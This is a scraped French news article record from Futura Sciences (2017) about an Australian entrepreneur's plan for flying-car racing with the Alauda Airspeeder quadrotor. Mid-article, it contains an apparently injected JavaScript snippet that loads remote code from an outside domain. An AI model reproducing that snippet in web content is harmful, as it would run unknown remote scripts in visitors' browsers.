{"title": "Bientot des courses de voitures volantes ?", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-12-13", "content": "S'inspirant du role de precurseur technologique que joue la Formule 1 dans l'automobile, un entrepreneur australien veut accelerer le developpement de la voiture volante en organisant des courses. La  voiture volante  suscite bien des projets, certains tres serieux, d'autres moins. Difficile pour le moment de dire ou se classe celui de Matt Pearson. Cet entrepreneur australien vient de lancer une campagne de financement sur Kickstarter pour fabriquer une voiture volante destinee a la competition. En realite, il ne s'agit pas a proprement parler d'une  voiture volante , car l'engin ne possede pas de roues. Il faut plutot parler d'un  drone  quadrirotor carene capable d'accueillir un pilote humain. L'idee peut sembler farfelue, mais le raisonnement qui la preside se tient. A l'instar de Formule 1, qui joue un role de laboratoire d'essai pour les technologies retrouvees ensuite dans les voitures de serie, creer une competition de voitures volantes contribuera a accelerer le developpement de ce moyen de transport.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un Airspeeder World Championship en 2020 L'engin imagine par Matt Pearson, qui n'existe pour le moment que sur le papier, sera mu par quatre moteurs electriques  brushless  (sans balais) de 50 kilowatts chacun alimentes par les memes cellules lithium-ion que celles utilisees dans la  Tesla  Model S. L'appareil nomme  Alauda Mark 1 Airspeeder  pourrait voler jusqu'a 250 km/h a une altitude maximale de 3,5 metres. Sa carrosserie sera fabriquee en  fibre de carbone  et le chassis en  aluminium  aeronautique pour un poids a vide de 120  kg . L'autonomie annoncee est d'a peine dix minutes, ce qui, dans l'etat, ne permet pas d'envisager une course digne d'interet. Qu'a cela ne tienne, un premier vol d'essai est cense avoir lieu debut 2018, suivi, un peu plus tard, d'une confrontation entre deux appareils dans le  desert  australien. Et, si tout se deroule selon les plans de Matt Pearson, le premier << Airspeeder World Championship >> impliquant differents constructeurs devrait avoir lieu en 2020. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  eoliennes volantes  |  soucoupes volantes nazis  |  soucoupes volantes video  |  fourmies volantes dans maison  |  fourmis volantes dans maison  |  voitures gpl  |  emissions co2 voitures  |  materiaux de voitures  |  voitures futuristes  |  voitures electriques", "theme": "tech"}